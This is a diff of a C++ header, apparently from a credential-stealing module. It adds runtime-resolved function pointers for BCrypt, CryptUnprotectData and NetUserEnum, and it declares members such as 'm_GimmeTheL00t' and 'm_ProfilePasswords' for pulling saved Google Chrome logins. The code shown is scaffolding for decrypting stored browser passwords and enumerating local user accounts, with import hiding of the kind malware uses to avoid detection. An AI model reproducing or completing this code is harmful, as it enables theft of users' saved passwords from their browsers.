@@ -71,6 +71,44 @@ struct User_Info {
 	DWORD dwCountryCode;
 };
 
+struct st_Bcrypt {
+	//BCryptDecrypt
+	typedef NTSTATUS(WINAPI* LPBCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
+	LPBCRYPTDECRYPT pBCryptDecrypt = nullptr;
+
+	//BCryptGenerateSymmetricKey
+	typedef NTSTATUS(WINAPI* LPBCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
+	LPBCRYPTGENERATESYMMETRICKEY pBCryptGenerateSymmetricKey = nullptr;
+
+	//BCryptOpenAlgorithmProvider
+	typedef NTSTATUS(WINAPI* LPLPBCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
+	LPLPBCRYPTOPENALGORITHMPROVIDER pBCryptOpenAlgorithmProvider = nullptr;
+
+	//BCryptCloseAlgorithmProvider
+	typedef NTSTATUS(WINAPI* LPBCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
+	LPBCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = nullptr;
+
+	//BCryptSetProperty
+	typedef NTSTATUS(WINAPI* LPBCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
+	LPBCRYPTSETPROPERTY pBCryptSetProperty = nullptr;
+};
+
+struct st_Crypt32 {
+	//CryptUnprotectData
+	typedef DPAPI_IMP BOOL(WINAPI* LPCRYPTUNPROTECTDATA)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
+	LPCRYPTUNPROTECTDATA pCryptUnprotectData = nullptr;
+};
+
+struct st_Netapi32 {
+	//NetUserEnum
+	typedef NET_API_STATUS(WINAPI* LPNETUSERENUM)(LPCWSTR, DWORD, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, PDWORD);
+	LPNETUSERENUM pNetUserEnum = nullptr;
+
+	//NetApiBufferFree
+	typedef NET_API_STATUS(WINAPI* LPNETAPIBUFFERFREE)(LPVOID);
+	LPNETAPIBUFFERFREE pNetApiBufferFree = nullptr;
+};
+
 class mod_Info {	
 	public:
 		void testData();
@@ -86,40 +124,26 @@ class mod_Info {
 
 		std::string m_GetUsersData();
 
-		mod_Info() {
-			NTSTATUS nStatus = 0;
-
-			nStatus = BCryptOpenAlgorithmProvider(&this->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
-			if (!BCRYPT_SUCCESS(nStatus)) {
-				__DBG_("BCryptOpenAlgorithmProvider error");
-				__DBG_(nStatus);
-				return;
-			}
-
-			nStatus = BCryptSetProperty(this->hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-			if (!BCRYPT_SUCCESS(nStatus)) {
-				__DBG_("BCryptSetProperty error");
-				__DBG_(nStatus);
-				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
-				return;
-			}
-		}
-
-		~mod_Info() {
-			if (this->hAlgorithm) {
-				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
-			}
-		}
+		mod_Info();
+		~mod_Info();
 
 	private:
+
+		HMODULE hBCryptDLL   = NULL;
+		HMODULE hCrypt32DLL  = NULL;
+		HMODULE hNetApi32DLL = NULL;
+
+		st_Bcrypt     BCRYPT;
+		st_Crypt32   CRYPT32;
+		st_Netapi32 NETAPI32;
 
 		std::vector<std::vector<std::string>> m_GimmeTheL00t(const char* cQuery, const char* cPath);
 		///////////////////////////////////////////////
 		///             GOOGLE CHROME               ///
 		///////////////////////////////////////////////
 		BCRYPT_ALG_HANDLE hAlgorithm = 0;
-		BCRYPT_KEY_HANDLE hKey = 0;
-		BCRYPT_KEY_HANDLE hKey2 = 0;
+		BCRYPT_KEY_HANDLE hKey       = 0;
+		BCRYPT_KEY_HANDLE hKey2      = 0;
 
 		//Datos de perfiles
 		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
